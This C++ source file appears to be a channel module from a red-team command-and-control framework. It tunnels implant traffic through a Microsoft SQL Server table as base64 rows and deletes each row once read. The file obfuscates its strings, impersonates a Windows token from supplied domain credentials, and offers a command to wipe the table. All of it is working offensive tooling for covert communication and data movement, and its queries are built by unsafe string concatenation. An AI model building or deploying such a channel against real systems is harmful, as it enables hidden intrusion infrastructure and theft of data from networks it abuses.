#include "Stdafx.h"
#include "MSSQL.h"
#include <sqlext.h>
#include <sqltypes.h>
#include <sql.h>
#include "Common/FSecure/Crypto/Base64.h"

#define DATA_LEN 1024
#define ID_COLUMN 1
#define MSGID_COLUMN 2
#define MSG_COLUMN 3
#define MAX_MSG_BYTES 700000000

FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto[servername, databasename, tablename, useSSPI, username, password] = arguments.Read<std::string, std::string, std::string, bool, std::string, std::string>();
	this->servername = servername;
	this->databasename = databasename;
	this->tablename = tablename;
	this->username = username;
	this->password = password;
	this->useSSPI = useSSPI;
	
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;

	//create a new impersonation token and inject it into the current thread.
	if (useSSPI && !this->username.empty())
	{
		std::string user, domain;
		HANDLE hToken;
		user = this->username.substr(this->username.find("\\") + 1, this->username.size());
		domain = this->username.substr(0, this->username.find("\\"));

		if (!LogonUserA(user.c_str(), domain.c_str(), this->password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
			throw std::runtime_error("[x] error creating Token");

		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &impersonationToken))
			throw std::runtime_error("[x] error duplicating token");
	}
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));

	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmtString = OBF("Select * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '") + tablename + OBF("';");
	SQLRETURN retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
	
	if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
	{
		throw std::runtime_error(OBF("[x] Unable to get DB schema"));
	}

	//if there are no rows then the table doesn't exist
	if (SQLFetch(hStmt) != SQL_SUCCESS)
	{
														
		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSGID varchar(250), MSG varchar(max));");
		
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

		retCode = SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS);
		if (retCode != SQL_SUCCESS && retCode != SQL_SUCCESS_WITH_INFO)
		{
			throw std::runtime_error(OBF("[x] Unable to create table"));
		}
	}
	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);

}

size_t FSecure::C3::Interfaces::Channels::MSSQL::OnSendToChannel(FSecure::ByteView packet)
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
	
	int bytesWritten = 0;
	std::string b64packet = "";
	std::string strpacket = "";
	int actualPacketSize = 0;
	
	//Rounded down: Max size of bytes that can be put into a MSSQL database before base64 encoding
	if (packet.size() > MAX_MSG_BYTES) {
		
		actualPacketSize = std::min((size_t)MAX_MSG_BYTES, packet.size());
		strpacket = packet.SubString(0, actualPacketSize);

		b64packet = cppcodec::base64_rfc4648::encode(strpacket.data(), strpacket.size());
		bytesWritten = strpacket.size();
	}
	else {
		b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
		bytesWritten = packet.size();
	}

	std::string stmtString = OBF("INSERT into dbo.") + this->tablename + OBF(" (MSGID, MSG) VALUES ('") + this->m_outboundDirectionName + "', '" + b64packet + OBF("');");
	
	if (SQLExecDirectA(hStmt, (SQLCHAR*)stmtString.c_str(), SQL_NTS) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Could not insert data\n"));

	
	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return bytesWritten;
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::MSSQL::OnReceiveFromChannel()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("SELECT TOP 100 * FROM dbo.") + this->tablename + OBF(" WHERE MSGID = '") + this->m_inboundDirectionName + OBF("';");
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);

	std::vector<ByteVector> messages;

	SQLCHAR ret[DATA_LEN];
	SQLLEN len;
	
	
	std::vector<json> data;
	
	
	while (SQLFetch(hStmt) == SQL_SUCCESS) 
	{
		std::string output;
		std::string id;

		//get the ID
		SQLGetData(hStmt, ID_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
		id = (char*)ret;
		json j;
		j[OBF("id")] = id;
	
		//Get the MSG column
		SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
		
		output += (char*)ret;

		if (len > DATA_LEN)
		{
			//loop until there is no data left
			while (len > DATA_LEN)
			{
				SQLGetData(hStmt, MSG_COLUMN, SQL_CHAR, ret, DATA_LEN, &len);
				output += (char*)ret;
			}

		}
		j[OBF("msg")] = output.c_str();
		data.push_back(j);
	}
	
	for (auto &msg : data)
	{
		//delete the row in the DB - must realloc the stmt handle
		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
		stmt = OBF("DELETE FROM dbo.") + this->tablename + OBF(" WHERE ID = '") + msg[OBF("id")].get<std::string>() + OBF("';");
		SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);

		//add the message to the messages vector
		auto m = cppcodec::base64_rfc4648::decode(msg[OBF("msg")].get<std::string>());
		
		messages.push_back(std::move(m));
	}

	SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
	SQLDisconnect(hConn);
	SQLFreeHandle(SQL_HANDLE_DBC, hConn);
	SQLFreeHandle(SQL_HANDLE_ENV, hEvt);
	return messages;
}

SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQLHANDLE* hEvt)
{
	SQLCHAR ret[DATA_LEN];
	SQLHANDLE lhConn = NULL, lhStmt = NULL, lhEvt = NULL;
	std::string connString;

	if (SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &lhEvt) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));
	if (SQLSetEnvAttr(lhEvt, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));
	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
		throw std::exception(OBF("[x] Error allocating handle"));

	if (this->useSSPI)
	{
		if (!this->username.empty())
		{
			if (!SetThreadToken(NULL, this->impersonationToken))
				throw std::runtime_error("[x] error setting token");
		}
			
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;");
	}
	else
		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";UID=") + this->username + OBF(";PWD=") + this->password;



	SQLRETURN retCode = SQLDriverConnectA(lhConn, NULL, (SQLCHAR*)connString.c_str(), SQL_NTS, ret, DATA_LEN, NULL, SQL_DRIVER_NOPROMPT);
	
	//Pointer dereferencing is done here to make the code easier to read
	*hConn = lhConn;
	*hEvt = lhEvt;

	return retCode;

}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::OnRunCommand(ByteView command)
{

	auto commandCopy = command;
	switch (command.Read<uint16_t>())
	{
	case 0:
		return ClearTable();
	default:
		return {};
	}
}

FSecure::ByteVector FSecure::C3::Interfaces::Channels::MSSQL::ClearTable()
{
	//connect to the database
	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
	if (Connect(&hConn, &hEvt) == SQL_ERROR)
		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));


	SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);

	std::string stmt = OBF("DELETE FROM dbo.") + this->tablename + ";";
	SQLExecDirectA(hStmt, (SQLCHAR*)stmt.c_str(), SQL_NTS);
	return {};


}

const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
{
	return R"_(
            {
                "create": {
		            "arguments":
		            [
			            [
				            {
					            "type": "string",
					            "name": "Input ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets for the channel"
				            },
				            {
					            "type": "string",
					            "name": "Output ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets from the channel"
				            }
			            ],
			            {
				            "type": "string",
				            "name": "Server Name",
				            "description": "The Host of the target database"
			            },
			            {
				            "type": "string",
				            "name": "Database Name",
				            "description": "The name of the database to write to"
			            },
			            {
				            "type": "string",
				            "name": "Table Name",
				            "description": "The name of the table to write to"
			            },
						{
							"type": "boolean",
							"name": "Use Current Windows Auth",
							"description": "Set this to true to use SSPI",
							"defaultValue": false
						},
			            {
				            "type": "string",
				            "name": "Username",
				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
							"min": 0
			            },
			            {
				            "type": "string",
				            "name": "Password",
				            "description": "The password used to authenticate to the database",
							"min": 0
			            }
		            ]
                },
               "commands":
	[
		{
			"name": "Clear DB Table",
			"id": 0,
			"description": "Deletes all rows in the database",
			"arguments": []
		}
	]
}
)_";
 
}

